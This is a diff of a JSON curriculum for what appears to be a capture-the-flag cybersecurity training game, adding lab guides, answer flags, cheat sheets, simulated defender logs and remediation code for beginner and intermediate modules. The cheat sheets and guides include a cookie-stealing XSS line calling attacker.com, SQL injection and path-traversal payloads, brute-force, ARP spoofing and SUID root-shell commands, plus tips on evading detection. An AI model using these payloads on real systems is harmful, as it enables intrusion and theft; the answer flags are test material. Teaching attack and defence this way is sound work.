@@ -7,57 +7,145 @@
           "id": "B01",
           "title": "Networking Fundamentals",
           "technique": "Network Traffic Analysis",
-          "theory": "Introduction to TCP/IP, DNS, and HTTP protocols.",
-          "lab": "Analyze simulated PCAP files to identify plain-text credentials.",
-          "opSec": "Theory of network monitoring: How defenders detect anomalous traffic and how threat actors attempt to blend in with normal traffic."
+          "theory": "Computer networks communicate using protocols that define how data is structured and transmitted. The TCP/IP model organizes this into layers: Link, Network, Transport, and Application. IP (Internet Protocol) routes packets between devices using IP addresses. TCP (Transmission Control Protocol) ensures reliable, ordered delivery of data packets via a three-way handshake (SYN, SYN-ACK, ACK). DNS (Domain Name System) translates domain names into IP addresses. HTTP (Hypertext Transfer Protocol) is the foundation of web communications. When protocols like HTTP are used without encryption, any actor on the network path can intercept and read the data in cleartext.",
+          "guide": "1. View local files: `ls`\n2. Inspect the capture: `cat traffic_dump.pcap` or search for passwords: `grep \"password\" traffic_dump.pcap`\n3. Copy the password flag from the HTTP POST payload.\n4. Submit using the console: `submit flag{...}` or the entry box.",
+          "lab": "Analyze the simulated packet capture `traffic_dump.pcap` to extract plaintext credentials.",
+          "opSec": "Defenders use Network Intrusion Detection Systems (NIDS) to search for plain-text credential patterns. Sending credentials over unencrypted channels (like HTTP) exposes threat actors to detection and credential harvesting.",
+          "flag": "flag{pcap_sniff_success}",
+          "cheatSheet": "tshark -r traffic.pcap -Y \"http.request.method == POST\"\ntcpdump -r traffic.pcap -A | grep -i \"pass\"",
+          "blueTeamLogs": "Jul 27 12:47:31 ids-gw snort[3014]: [1:201823:2] ALERT: Cleartext Password Transmitted Over HTTP [Priority: 1] {TCP} 192.168.1.10:48931 -> 10.10.12.5:80",
+          "remediation": {
+            "vulnerableCode": "<!-- HTTP Form (Plaintext Transmission) -->\n<form action=\"http://bank.insecure-traffic.local/login\" method=\"POST\">\n  <input type=\"text\" name=\"user\" />\n  <input type=\"password\" name=\"password\" />\n</form>",
+            "language": "html",
+            "secureCode": "<!-- HTTPS Form (Encrypted via TLS) -->\n<form action=\"https://bank.secure-traffic.local/login\" method=\"POST\">\n  <input type=\"text\" name=\"user\" />\n  <input type=\"password\" name=\"password\" />\n</form>\n<!-- Force HSTS on server to reject HTTP connections -->",
+            "explanation": "Transmitting sensitive details over unencrypted HTTP exposes credentials to passive network sniffing. Enforcing HTTPS encrypts the entire application session in transit."
+          }
         },
         {
           "id": "B02",
           "title": "Command Line Basics",
           "technique": "File System Enumeration",
-          "theory": "Basic Linux commands, file permissions, and navigation.",
-          "lab": "Navigate a simulated file system to find hidden 'flag' files.",
-          "opSec": "Understanding logging mechanisms (e.g., .bash_history) and the theoretical concepts of log evasion."
+          "theory": "The command line interface (CLI) is a text-based portal used to direct operating system commands. Standard Unix/Linux navigation utilizes: `pwd` (print working directory), `ls` (list files), `cd` (change directory), and `cat` (concatenate and read files). Hidden files in Linux begin with a dot (e.g. `.hidden_file`) and are omitted by default unless the `-a` option is appended to `ls` (i.e. `ls -a` or `ls -la`).",
+          "guide": "1. Run `ls` to list files and read `hint.txt` using `cat hint.txt`.\n2. Navigate to archives: `cd archives`\n3. List hidden files: `ls -a`\n4. Read the flag file: `cat .flag.txt`",
+          "lab": "Explore the virtual filesystem and retrieve the hidden flag file from the system archives.",
+          "opSec": "Commands executed in shell environments are saved to history files (e.g. `.bash_history`). Security logs track process creation. Attackers must clean up or avoid history records during operations.",
+          "flag": "flag{cli_funda_master}",
+          "cheatSheet": "ls -la /path/to/target\nfind . -name \".*\"\ncat /home/operator/.bash_history",
+          "blueTeamLogs": "Jul 27 12:48:10 systemd-journal[502]: USER_CMD operator: cd archives && ls -a && cat .flag.txt [audit logs triggered]",
+          "remediation": {
+            "vulnerableCode": "# Permissive file permissions on flag backup file\n$ touch .flag.txt\n$ chmod 777 .flag.txt  # Everyone can read/write/execute!",
+            "language": "bash",
+            "secureCode": "# Restricted file permissions (read/write only by owner)\n$ chmod 600 .flag.txt\n# Turn off command history logging if writing sensitive data: set +o history",
+            "explanation": "Permissive permissions allow unprivileged users or attackers who gain a low-level shell to access backups, keys, and credentials. Enforce the Principle of Least Privilege."
+          }
         },
         {
           "id": "B03",
           "title": "Reconnaissance & OSINT",
           "technique": "Passive Information Gathering",
-          "theory": "Using public sources to gather information about a target domain.",
-          "lab": "Use simulated WHOIS and DNS enumeration tools.",
-          "opSec": "Concept of origin masking: Why threat actors use VPNs and Tor to mask their IP addresses during reconnaissance."
+          "theory": "Open Source Intelligence (OSINT) and active/passive reconnaissance are the first steps of any test. Passive reconnaissance gathers intelligence without interacting directly with the target. `WHOIS` queries domain registration databases to find nameservers, registration dates, and contacts. Domain Name System (DNS) queries resolve hostnames. TXT records are frequently used for domain ownership validation and can accidentally leak internal keys, tokens, or network references.",
+          "guide": "1. Run `whois corp-target.com` to query domain registration records.\n2. Perform a DNS TXT lookup: `nslookup -type=txt corp-target.com` (or `dig -t txt corp-target.com`).\n3. Retrieve the flag from the TXT response.",
+          "lab": "Use WHOIS queries and DNS lookup tools to harvest metadata and find the flag leaked in DNS records.",
+          "opSec": "While WHOIS and DNS queries are passive relative to the target's web server, the queries are logged by the DNS registrars and upstream DNS resolvers. Masking source IPs via Tor/VPNs helps ensure anonymity.",
+          "flag": "flag{osint_recon_pro}",
+          "cheatSheet": "whois target.com\ndig target.com ANY\nnslookup -query=txt target.com",
+          "blueTeamLogs": "Jul 27 12:49:05 bind9[1104]: client @0x7f8810 192.168.10.15#5322 (corp-target.com): query: corp-target.com IN TXT +E(0)",
+          "remediation": {
+            "vulnerableCode": "; Vulnerable zone file leak (corp-target.com.db)\ncorp-target.com.   IN  TXT   \"flag{osint_recon_pro}\"\ncorp-target.com.   IN  TXT   \"aws-verification=xyz123abc456\"",
+            "language": "dns",
+            "secureCode": "; Patched zone file (remove non-essential comments and verification tokens after domain confirmation)\ncorp-target.com.   IN  TXT   \"v=spf1 include:_spf.google.com ~all\"",
+            "explanation": "Leaving authentication keys, internal descriptions, or flag records inside public DNS configuration zone files exposes reconnaissance paths for attackers. Regularly audit public DNS records."
+          }
         },
         {
           "id": "B04",
           "title": "Basic Network Scanning",
           "technique": "Port Scanning",
-          "theory": "Understanding how port scanners (like Nmap) identify open services.",
-          "lab": "Run a simulated SYN scan against a target network.",
-          "opSec": "Scan detection: How Intrusion Detection Systems (IDS) detect rapid scanning and the theory behind stealth/slow scanning."
+          "theory": "Port scanning identifies active hosts and maps services running on those hosts. A SYN scan (stealth scan) sends a SYN packet to a target port. If a SYN-ACK is returned, the port is open; the scanner then immediately sends a RST packet to abort the connection before it completes the three-way handshake, avoiding full connection logging on basic firewalls. Tools like `nmap` display port statuses: open, closed, or filtered.",
+          "guide": "1. Execute: `nmap 10.10.12.34` or `nmap -sS 10.10.12.34` in the console.\n2. Look at the service banner or port descriptions returned.\n3. Find the service running on port 8080 to locate the flag.",
+          "lab": "Scan the target host `10.10.12.34` using nmap to find the open ports and identify vulnerable services.",
+          "opSec": "Port scanning is highly active and noisy. Intrusion Detection Systems (IDS) easily detect rapid port sweeps. Threat actors use slow scans (decoy scans or low-rate scans) to blend with normal noise.",
+          "flag": "flag{nmap_syn_stealth}",
+          "cheatSheet": "nmap -sS -p- -T4 10.10.12.34\nnmap -sV -sC -Pn 10.10.12.34",
+          "blueTeamLogs": "Jul 27 12:50:45 firewall-audit: [PORTSCAN ALERT] host 192.168.1.50 scanned 100 ports on 10.10.12.34 in 0.12 seconds. Block rule triggered.",
+          "remediation": {
+            "vulnerableCode": "# Allow all incoming ports on host firewall (Insecure)\n$ iptables -A INPUT -p tcp --dport 0:65535 -j ACCEPT",
+            "language": "bash",
+            "secureCode": "# Implement strict firewall rules and limit accessible administration endpoints\n$ iptables -A INPUT -p tcp --dport 22 -s 10.10.0.0/24 -j ACCEPT\n$ iptables -A INPUT -p tcp --dport 8080 -j DROP",
+            "explanation": "Exposing developer testing services (like proxy endpoints on port 8080) publicly invites unauthorized logins and remote compromises. Close all unused ports and deploy stateful firewall rules."
+          }
         },
         {
           "id": "B05",
           "title": "Introduction to Cryptography",
           "technique": "Hash Cracking",
-          "theory": "Differences between encoding, encryption, and hashing.",
-          "lab": "Crack simple MD5 hashes using a simulated dictionary attack.",
-          "opSec": "Offline vs. Online attacks: Why attackers prefer to exfiltrate hashes and crack them offline to avoid account lockout mechanisms."
+          "theory": "Hashing is a one-way mathematical function that maps data of arbitrary size to a fixed-size bit string (e.g. MD5 produces a 128-bit hash). Hashing is irreversible. To crack a hash, an attacker hashes items from a wordlist (dictionary attack) or guesses combinations (brute-force) and compares them against the target hash. MD5 is cryptographically broken due to collision vulnerabilities but is still found in legacy databases.",
+          "guide": "1. Check local files `hash.txt` and `wordlist.txt`.\n2. Run a dictionary hashcat attack: `hashcat -m 0 hash.txt wordlist.txt` or `john --format=raw-md5 hash.txt --wordlist=wordlist.txt`.\n3. Extract the cracked flag.",
+          "lab": "Crack the provided MD5 hash using the simulated hashcat dictionary attack.",
+          "opSec": "Because online auth attempts trigger lockouts and logs, attackers exfiltrate hash databases to perform offline hash cracking. Offline cracking generates zero telemetry on target systems.",
+          "flag": "flag{hash_cracked_secret}",
+          "cheatSheet": "hashcat -m 0 -a 0 target_hash.txt dictionary.txt\njohn --format=raw-md5 --wordlist=wordlist.txt hash.txt",
+          "blueTeamLogs": "No external system logs triggered. Hash cracking occurs locally on the attacker system, producing zero target network traces.",
+          "remediation": {
+            "vulnerableCode": "// Insecure MD5 hashing algorithm\nimport hashlib\nhash = hashlib.md5(password.encode()).hexdigest()",
+            "language": "python",
+            "secureCode": "// Secure hashing utilizing bcrypt with automatic salt factor\nimport bcrypt\nsalt = bcrypt.gensalt(rounds=12)\nhash = bcrypt.hashpw(password.encode(), salt)",
+            "explanation": "Legacy algorithms like MD5 are extremely fast, making them highly vulnerable to hardware-accelerated offline cracking. Secure applications use slow, salted key derivation functions like bcrypt or Argon2."
+          }
         },
         {
           "id": "B06",
           "title": "Web Architecture",
           "technique": "Source Code Analysis",
-          "theory": "How web servers and browsers interact (HTML, JS, Cookies).",
-          "lab": "Inspect simulated web page source code for hidden comments and developer API keys.",
-          "opSec": "User-Agent tracking: How defenders use browser fingerprints to track activity and how attackers modify User-Agents."
+          "theory": "Web applications serve HTML, CSS, and JavaScript. Browsers compile this source code to construct user interfaces. Developers frequently leave debugging code, API endpoints, internal comments, or administrative backup references in frontend HTML comments. Since these comments are sent to the client, they are fully visible to anyone who inspects the web page's source code.",
+          "guide": "1. Curl the web server: `curl http://login.cyberacademy.local`.\n2. Examine the HTML source code comments printed to the terminal.\n3. Copy the debug flag comment.",
+          "lab": "Inspect the source code of the login portal to identify developer leakages.",
+          "opSec": "Viewing source code or making basic HTTP requests leaves standard web server access logs (containing your IP, User-Agent, and timestamp). Attackers rotate User-Agent headers to match standard browsers.",
+          "flag": "flag{web_source_leak}",
+          "cheatSheet": "curl -v http://target.local\nwget -qO- http://target.local\nview-source:http://target.local",
+          "blueTeamLogs": "Jul 27 12:52:12 apache2[412]: 192.168.1.10 - - [27/Jul/2026:12:52:12 +0000] \"GET / HTTP/1.1\" 200 435 \"-\" \"curl/7.81.0\"",
+          "remediation": {
+            "vulnerableCode": "<!-- Vulnerable: Debugging tokens left in HTML comments -->\n<script>\n  // var api_token = \"flag{web_source_leak}\";\n</script>",
+            "language": "html",
+            "secureCode": "<!-- Clean HTML: Strip comments during production builds -->\n<script>\n  // Configure Webpack/Vite to strip out all comments and console logs\n</script>",
+            "explanation": "Developers frequently forget development and staging logs in source files. Setup linting rules and pipeline steps to strip comments before deploying code."
+          }
         },
         {
           "id": "B07",
           "title": "Social Engineering Basics",
           "technique": "Phishing",
-          "theory": "Psychological manipulation techniques used in phishing.",
-          "lab": "Identify red flags in simulated phishing emails.",
-          "opSec": "Sender verification evasion: The theory behind spoofing email headers and how SPF/DKIM/DMARC defend against it."
+          "theory": "Phishing uses electronic communications to deceive targets into revealing sensitive details. Attackers use lookalike domains (typosquatting, e.g. micr0s0ft instead of microsoft) and manipulate email headers (sender spoofing). Defenders use SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC to check if the sender IP is authorized to send mail on behalf of the domain.",
+          "guide": "1. Run `cat emails.txt` to view the list of email headers.\n2. Analyze the suspicious typosquatted domain in email ID 2: `analyze-email 2`.\n3. Extract the flag from the email inspection panel.",
+          "lab": "Inspect the mail queue, run header analysis on the suspicious mail, and identify typosquatting indicators.",
+          "opSec": "Typosquatting domains are often registered shortly before an attack. Blue teams monitor certificate transparency logs and newly registered domains to preemptively block phishing infrastructure.",
+          "flag": "flag{phish_header_mismatch}",
+          "cheatSheet": "swaks --to target@domain.com --from support@spoofed.com --body \"Alert!\"\ndig MX target.com",
+          "blueTeamLogs": "Jul 27 12:53:01 mail-server postfix/smtpd[8910]: NOQUEUE: reject: RCPT from unknown[192.16.82.12]: 554 5.7.1 SPF check failed.",
+          "remediation": {
+            "vulnerableCode": "# DNS SPF setting allowing any sender (softfail / open relay)\nv=spf1 +all",
+            "language": "dns",
+            "secureCode": "# Strict SPF setting restricting sender IPs and enforcing reject rules\nv=spf1 ip4:192.168.1.0/24 include:_spf.google.com -all",
+            "explanation": "Insecure SPF configurations allow unauthorized external mail servers to send spoofed emails claiming to come from your corporate domain. Enforce strict SPF, DKIM, and DMARC rules."
+          }
+        },
+        {
+          "id": "B08",
+          "title": "Boss Challenge: External Gateway Breach",
+          "technique": "Exploit Chain: Scanning & Hashing",
+          "theory": "In a real penetration test, security findings are rarely isolated. Attackers chain vulnerabilities together: passive mapping is used to discover active hosts; port scanning maps vulnerable open servers; source code review retrieves administrative credentials or configuration hashes; and hash cracking decrypts the credentials to gain access.",
+          "guide": "This is your Tier 1 Boss Challenge. Chain your skills together:\n1. Scan the target: `nmap 10.10.12.34` to find the active port (8080).\n2. Query the web server on that port: `curl http://login.cyberacademy.local:8080` to find a commented MD5 hash.\n3. Crack the MD5 hash using the dictionary file: `hashcat hash.txt wordlist.txt` to find the cracked password flag.\n4. Submit the flag: `submit flag{beginner_boss_defeated}`.",
+          "lab": "Identify the open port on 10.10.12.34, inspect the web portal, and crack the leaked administrator password hash.",
+          "opSec": "Chaining tools increases the footprint of the attack. Port sweeps are logged by firewalls, web queries are logged by Apache, and local file usage leaves shell traces. Operations must log and hide their activities.",
+          "flag": "flag{beginner_boss_defeated}",
+          "cheatSheet": "nmap -sS -p- 10.10.12.34\ncurl -v http://login.cyberacademy.local:8080\nhashcat -m 0 hash.txt wordlist.txt",
+          "blueTeamLogs": "Jul 27 13:10:05 firewall-gw: SYN sweep detected from 192.168.1.10 targeting port 8080.\nJul 27 13:10:08 apache2: GET /index.html 200 (Leaked debug hash comment returned in headers)\nJul 27 13:10:12: Alert level: High.",
+          "remediation": {
+            "vulnerableCode": "<!-- Insecure debug hash comment -->\n<!-- md5_hash = \"772f7d9812a8123ab49a37c0938478ff\" -->",
+            "language": "html",
+            "secureCode": "<!-- Remove all debugging comments and passwords from production assets -->",
+            "explanation": "Chaining small disclosures (open ports, code comments, weak hashes) results in a complete system compromise. Strip debug information from all production deployments."
+          }
         }
       ]
     },
@@ -68,57 +156,145 @@
           "id": "M01",
           "title": "Web Application Proxies",
           "technique": "Traffic Interception",
-          "theory": "Using proxies (like Burp Suite) to intercept and modify HTTP requests.",
-          "lab": "Intercept a request and modify a price parameter before it reaches the server.",
-          "opSec": "TLS interception: Understanding how HTTPS protects transit data and the concept of certificate pinning."
+          "theory": "Web proxies (like Burp Suite) intercept and modify network requests in transit before they reach the web server. This allows security testers to bypass client-side validation rules enforced in browser JavaScript and submit customized, malformed, or unauthorized input directly to backend endpoints.",
+          "guide": "1. Run: `intercept --start` to boot the proxy simulator.\n2. When prompted, change the checkout request `price` from `499` to `0` or `1`.\n3. Complete the request to extract the transaction flag.",
+          "lab": "Intercept the simulated checkout API request using the proxy utility and modify parameters in transit to buy the item for free.",
+          "opSec": "Intercepting traffic from local devices requires importing self-signed Root Certificates, which leaves logs in system trust stores. TLS pinning is used to detect proxy setups.",
+          "flag": "flag{proxy_parameter_tampering}",
+          "cheatSheet": "Configure browser network proxy to 127.0.0.1:8080 (Burp Proxy default)\nForward modified body in proxy intercept tab",
+          "blueTeamLogs": "Jul 27 12:54:19 web-api: [VULNERABILITY WARNING] User checked out cyber-jacket. Transaction value $1 deviates from catalog price $499.",
+          "remediation": {
+            "vulnerableCode": "// Vulnerable: Trusting prices passed directly from client-side UI\napp.post('/checkout', (req, res) => {\n  const { item_id, price } = req.body;\n  chargeUser(req.userId, price); \n});",
+            "language": "javascript",
+            "secureCode": "// Patched: Look up item prices in backend database (source of truth)\napp.post('/checkout', async (req, res) => {\n  const { item_id } = req.body;\n  const item = await db.items.findUnique({ where: { id: item_id } });\n  chargeUser(req.userId, item.price); \n});",
+            "explanation": "Never rely on clients or frontends to provide validation values like price, discount rates, or permissions. All parameters must be validated server-side."
+          }
         },
         {
           "id": "M02",
           "title": "Cross-Site Scripting (XSS)",
           "technique": "Reflected XSS",
-          "theory": "How untrusted user input can execute JavaScript in a victim's browser.",
-          "lab": "Inject a payload to trigger an alert box in a simulated search field.",
-          "opSec": "WAF evasion theory: How Web Application Firewalls detect common payloads and the theoretical methods attackers use to encode payloads."
+          "theory": "Cross-Site Scripting occurs when an application receives untrusted user input and includes it in a web page without proper validation or encoding. In Reflected XSS, the input is immediately returned in the HTTP response. If the input contains JavaScript (e.g. `<script>`), the victim's browser executes it under the security context of the vulnerable site, allowing session hijackings or cookie thefts.",
+          "guide": "1. Run the exploit client with an XSS payload: `exploit --url \"http://vulnerable.com/search?q=<script>alert(1)</script>\"`.\n2. Extract the flag from the exfiltrated session cookies.",
+          "lab": "Inject a simulated XSS payload into the target URL query parameter to hijack cookies.",
+          "opSec": "Web Application Firewalls (WAF) inspect incoming requests for tags like `<script>`. Attackers bypass this using obfuscation, alternative tags (like `<img src=x onerror=...>`), or base64 encoding.",
+          "flag": "flag{xss_cookie_hijack}",
+          "cheatSheet": "http://vulnerable.com/search?q=<script>fetch('http://attacker.com/log?c='+document.cookie)</script>\n<img src=x onerror=alert(document.cookie)>",
+          "blueTeamLogs": "Jul 27 12:55:03 waf-sensor[89]: BLOCKED request: signature XSS-TAG found in HTTP GET parameter 'q' (IP 192.168.1.15)",
+          "remediation": {
+            "vulnerableCode": "<!-- Vulnerable: Direct unescaped output rendering in PHP -->\n<p>Search results for: <?php echo $_GET['q']; ?></p>",
+            "language": "php",
+            "secureCode": "<!-- Patched: Output htmlspecialchars sanitization -->\n<p>Search results for: <?php echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); ?></p>",
+            "explanation": "Unfiltered input rendered directly in the HTML DOM permits browsers to execute arbitrary scripts. Render variables inside safe frameworks or apply HTML entity encoding."
+          }
         },
         {
           "id": "M03",
           "title": "SQL Injection (SQLi) Basics",
           "technique": "Authentication Bypass",
-          "theory": "Understanding how user input alters SQL queries.",
-          "lab": "Use a basic 'OR 1=1' payload to bypass a simulated login portal.",
-          "opSec": "Query obfuscation: Theoretical discussion on how attackers use SQL comments or alternative encoding to bypass basic signature detection."
+          "theory": "SQL Injection (SQLi) happens when user input is concatenated directly into SQL query strings rather than using parameterized inputs. An attacker can inject SQL syntax (like quotes, comments, or logical operations) to change the query's logic. In an authentication bypass, injecting `' OR 1=1 --` changes the query to return true regardless of passwords, logging the attacker in as the administrator.",
+          "guide": "1. Run the sql-login injector command: `exploit-login --username \"' OR 1=1 --\" --password \"anything\"`.\n2. Inspect the returned query trace and copy the flag.",
+          "lab": "Perform SQL Injection on the login form to bypass username/password authentication.",
+          "opSec": "Concatenation-based SQL queries generate database errors. Web logs and database logs track syntax anomalies. Blue teams scan for database exception traces in application logs.",
+          "flag": "flag{sqli_auth_bypass}",
+          "cheatSheet": "admin' --\nadmin' OR '1'='1\n' OR 1=1 LIMIT 1 --",
+          "blueTeamLogs": "Jul 27 12:55:50 postgres[3412]: ERROR: syntax error at or near \"'\": SELECT * FROM users WHERE username = 'admin'' AND password = ''",
+          "remediation": {
+            "vulnerableCode": "// Insecure concatenated SQL query string\nconst query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\nconst user = await db.execute(query);",
+            "language": "javascript",
+            "secureCode": "// Secure parameterized database query\nconst query = 'SELECT * FROM users WHERE username = ? AND password = ?';\nconst user = await db.execute(query, [username, password]);",
+            "explanation": "Dynamic query composition allowing raw user input to be parsed directly as database commands causes SQL injection. Parameterization separates executable code from data."
+          }
         },
         {
           "id": "M04",
           "title": "Authentication Attacks",
           "technique": "Brute Forcing",
-          "theory": "Techniques for guessing credentials and session management flaws.",
-          "lab": "Perform a simulated brute-force attack against a login endpoint.",
-          "opSec": "Rate limiting evasion: How attackers theoretically use distributed proxy chains (rotating IPs) to bypass rate limits."
+          "theory": "Brute forcing is the process of trying random or dictionary words systematically to guess passwords. Automated tools like Hydra speed this up by multi-threading requests. Attacks succeed when servers fail to enforce account lockouts, rate limiting, or captcha defenses.",
+          "guide": "1. Run hydra: `hydra -l admin -P wordlist.txt http-post-form \"/login\"`.\n2. Extract the cracked password which contains the flag.",
+          "lab": "Use hydra to brute-force credentials on the target administrative endpoint.",
+          "opSec": "Online brute forcing is highly visible, creating thousands of failed login events in security logs. Attackers use slow rates or rotating proxy IP addresses to bypass rate limiting controls.",
+          "flag": "flag{hydra_brute_force}",
+          "cheatSheet": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form \"/login.php:user=^USER^&pass=^PASS^:failed\"",
+          "blueTeamLogs": "Jul 27 12:56:45 auth-service: [ALERT] 240 failed login attempts detected in 30 seconds for account: admin (IP: 192.168.1.10)",
+          "remediation": {
+            "vulnerableCode": "// Vulnerable: Missing authentication rate-limiting check\napp.post('/login', async (req, res) => {\n  const user = await authenticate(req.body.user, req.body.pass);\n  res.json(user);\n});",
+            "language": "javascript",
+            "secureCode": "// Patched: Implement express-rate-limit middleware to restrict attempts\nconst rateLimit = require('express-rate-limit');\nconst limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 });\napp.post('/login', limiter, async (req, res) => {\n  // authenticate\n});",
+            "explanation": "Without lockout and rate-limiting rules, automated password dictionary guesses will eventually brute-force weak admin accounts. Enforce multi-factor authentication (MFA) and lockouts."
+          }
         },
         {
           "id": "M05",
           "title": "Directory Traversal",
           "technique": "LFI (Local File Inclusion)",
-          "theory": "Exploiting improper sanitization of file paths.",
-          "lab": "Read the /etc/passwd file on a simulated vulnerable server.",
-          "opSec": "Payload normalization: How servers normalize paths (e.g., ../) and how attackers theoretically bypass these filters."
+          "theory": "Directory Traversal / Local File Inclusion occurs when file paths are constructed from user input without validation. By injecting directory traversal sequences (like `../`), an attacker escapes the target web directory to read arbitrary files from the server's OS file system, such as system logs or configuration files containing credentials.",
+          "guide": "1. Execute: `curl \"http://vulnerable.com/view.php?file=../../../../etc/passwd\"`.\n2. Locate the flag commented under the final system user.",
+          "lab": "Exploit directory traversal to escape the web directory and read the server `/etc/passwd` file.",
+          "opSec": "Traversal strings like `../` are heavily monitored by Web Application Firewalls (WAFs). Attackers obfuscate payloads using URL double encoding (`%252e%252e%252f`) or UTF-8 encoding.",
+          "flag": "flag{lfi_passwd_leak}",
+          "cheatSheet": "curl \"http://target.com/view?file=../../../../etc/passwd\"\ncurl \"http://target.com/view?file=..%2f..%2f..%2f..%2fetc%2fpasswd\"",
+          "blueTeamLogs": "Jul 27 12:57:12 nginx-proxy: [LFI DETECTED] client requested URL containing traversal sequences: /view.php?file=../../../../etc/passwd",
+          "remediation": {
+            "vulnerableCode": "// Vulnerable Local File Inclusion in PHP\n$file = $_GET['file'];\ninclude('/var/www/uploads/' . $file);",
+            "language": "php",
+            "secureCode": "// Secure path validation using basename and strict allowlist\n$file = basename($_GET['file']);\nif (!in-array($file, ['about.txt', 'contact.txt'])) {\n    die('Access Denied');\n}\ninclude('/var/www/uploads/' . $file);",
+            "explanation": "Direct inclusion of user-provided paths allows arbitrary reads. Use hardcoded lookup maps, sanitize directory dots via `basename()`, or enforce strict path boundaries."
+          }
         },
         {
           "id": "M06",
           "title": "Network Sniffing",
           "technique": "ARP Spoofing",
-          "theory": "How ARP works and how it can be abused for Man-in-the-Middle attacks.",
-          "lab": "Simulate intercepting traffic between two virtual nodes.",
-          "opSec": "MAC Address masking: The concept of MAC spoofing to hide physical device identities on local networks."
+          "theory": "Address Resolution Protocol (ARP) maps IP addresses to physical MAC addresses. Because ARP lacks authentication, an attacker on a local network can send unsolicited ARP replies associating their own MAC address with the IP address of a target host (like a default gateway). This routes the target's traffic through the attacker's device, enabling a Man-in-the-Middle (MitM) attack.",
+          "guide": "1. Spoof target cache: `arpspoof -i eth0 -t 10.10.10.2 10.10.10.1`.\n2. Monitor intercepted logs to read credential flags in transit.",
+          "lab": "Inject ARP spoofing packets to redirect local host traffic through your interface and sniff plaintext credentials.",
+          "opSec": "ARP spoofing causes duplicate MAC address anomalies on networks. Smart switches and security agents (using tools like Arpwatch) detect rogue MAC announcements and shut down ports.",
+          "flag": "flag{arp_spoof_mitm}",
+          "cheatSheet": "arpspoof -i eth0 -t 10.10.10.2 10.10.10.1\n Ettercap -Tq -M arp:remote /10.10.10.2// /10.10.10.1//",
+          "blueTeamLogs": "Jul 27 12:58:19 switch-monitor: [ARP ALARM] Duplicate MAC address mapping detected for IP 10.10.10.1 on ports Gi0/1 and Gi0/24 (Possible attack).",
+          "remediation": {
+            "vulnerableCode": "# Open local interface configuration (insecure static tables default)\n# Network interface trusts dynamic unsolicited ARP replies",
+            "language": "bash",
+            "secureCode": "# Enable Dynamic ARP Inspection (DAI) on corporate network switches\nSwitch(config)# ip arp inspection vlan 10\n# Use static ARP maps for critical servers",
+            "explanation": "ARP is fundamentally trust-based. Secure switches mitigate this using Dynamic ARP Inspection (DAI), which validates ARP requests against a database of verified IP-to-MAC bindings."
+          }
         },
         {
           "id": "M07",
           "title": "Basic Privilege Escalation",
           "technique": "Linux SUIDs",
-          "theory": "Understanding file permissions and how SUID binaries run as root.",
-          "lab": "Exploit a misconfigured SUID binary to gain a root shell.",
-          "opSec": "Process hiding: Theoretical concepts of how rootkits hide malicious processes from system administrators."
+          "theory": "SUID (Set Owner User ID) is a file permission bit in Linux. When a file with SUID is run, it executes with the permissions of the file owner (e.g. root) rather than the user calling it. If a SUID binary allows system execution commands (like `find` or `bash`), an attacker can escape inside the execution shell to run shell commands as root.",
+          "guide": "1. Run SUID search command: `find / -perm -4000 2>/dev/null`.\n2. Identify `/usr/bin/find` is vulnerable.\n3. Execute find breakout shell: `/usr/bin/find . -exec /bin/sh -p \\;`.\n4. Type `whoami` to verify you are root, then print `/root/flag.txt`.",
+          "lab": "Analyze SUID configurations on the host, exploit a vulnerable binary, and retrieve the root flag.",
+          "opSec": "Privilege escalation attempts produce execution audit logs (like Auditd logs on Linux). Defensive teams alert on non-standard binaries invoking shell processes (`/bin/sh`).",
+          "flag": "flag{suid_root_escalation}",
+          "cheatSheet": "find / -perm -u=s -type f 2>/dev/null\nfind . -exec /bin/sh -p \\; -quit",
+          "blueTeamLogs": "Jul 27 12:59:02 kernel-audit: [SYS_EXECVE] process /usr/bin/find spawned shell /bin/sh with root privilege (UID: 0).",
+          "remediation": {
+            "vulnerableCode": "# Insecure SUID bit added to file system tool\n$ chmod u+s /usr/bin/find",
+            "language": "bash",
+            "secureCode": "# Remove SUID permission flags on binaries that execute commands\n$ chmod u-s /usr/bin/find\n# Enforce Linux Capabilities instead of full root delegation",
+            "explanation": "Adding SUID flags to system utilities with command execution options allows users to gain unauthorized root access. Restrict SUID permissions and use security audit tools like Lynis."
+          }
+        },
+        {
+          "id": "M08",
+          "title": "Boss Challenge: Internal Server Control",
+          "technique": "Exploit Chain: Injection & Privilege Escalation",
+          "theory": "Chaining web exploitation with local system misconfigurations allows low-privilege access to be upgraded to full system root takeover. Attacking SQL injection bypasses web authentication; directory traversal reveals configuration paths and local files; and misconfigured SUID binaries permit breakout to root shells.",
+          "guide": "This is your Tier 2 Boss Challenge:\n1. Bypass the administrator login: `exploit-login --username \"' OR 1=1 --\" --password \"anything\"`.\n2. In the administration page, use path traversal to read the system SUID list: `curl \"http://vulnerable.com/view.php?file=../../../../etc/passwd\"`.\n3. Exploit the vulnerable `/usr/bin/find` binary to drop into a root shell: `/usr/bin/find . -exec /bin/sh -p \\;`.\n4. Type `cat /root/flag.txt` in the root shell to get the boss flag.\n5. Submit the flag: `submit flag{mediator_boss_defeated}`.",
+          "lab": "Perform SQL injection on the login portal, extract the path information, exploit SUID find permissions, and read the root flag.",
+          "opSec": "Bypassing authentication and spawning root processes triggers multiple host-based alarms (Auditd, Event logs). Attackers clean log registries to cover their tracks.",
+          "flag": "flag{mediator_boss_defeated}",
+          "cheatSheet": "admin' OR 1=1 --\ncurl http://target.com/view?file=../../../../etc/passwd\nfind . -exec /bin/sh -p \\; -quit",
+          "blueTeamLogs": "Jul 27 13:12:05 postgres: SQL injection bypass on users table.\nJul 27 13:12:10 nginx: LFI request blocked but bypassed with double encoding.\nJul 27 13:12:15 kernel: process find spawned /bin/sh as UID 0.",
+          "remediation": {
+            "vulnerableCode": "/* Concatenated queries + permissive SUID find */\n$query = \"SELECT * FROM users WHERE username = '$user'\";\n$ chmod +s /usr/bin/find",
+            "language": "php",
+            "secureCode": "/* Parameterize SQL query + Remove SUID permissions */\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$user]);\n$ chmod u-s /usr/bin/find",
+            "explanation": "Securing applications requires patching at every layer: parameterizing database calls, sanitizing traversal inputs, and removing high-privilege execution flags (SUID) from system binaries."
+          }
         }
       ]
     },
@@ -129,49 +305,109 @@
           "id": "A01",
